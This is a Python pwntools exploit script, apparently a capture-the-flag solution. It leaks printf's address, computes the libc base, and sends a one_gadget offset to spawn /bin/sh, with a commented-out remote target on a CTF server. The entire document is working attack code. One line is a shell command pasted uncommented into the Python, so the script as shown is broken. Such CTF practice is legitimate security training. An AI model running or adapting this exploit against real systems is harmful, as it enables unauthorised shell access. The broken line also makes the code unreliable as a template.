#!/usr/bin/python3.6
from pwn import *

filename = './one_gadget'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
proc = process(filename)
one_gadget -f /lib/x86_64-linux-gnu/libc.so.6
one_gadget_off = 0x45216

# libc = ELF('/home/ubuntu/project/libc/buuoj-ubuntu1904-x86_64-libc-2.29.so')
# proc = remote('node3.buuoj.cn', 29405)
# # one_gadget -f /home/ubuntu/project/libc/libc-2.29.so
# one_gadget_off = 0x106ef8

proc.recvuntil(b'here is the gift for u:')
printf_addr = int(proc.recvuntil(b'\n'), 16)
log.info(f'printf libc={hex(printf_addr)}')

libc_base = printf_addr - libc.sym['printf']
log.info(f'libc base={hex(libc_base)}')
log.info(f'execve("/bin/sh")={hex(one_gadget_off + libc_base)}')

proc.recvuntil(b'Give me your one gadget:')
proc.sendline(str(one_gadget_off + libc_base).encode())

proc.interactive()
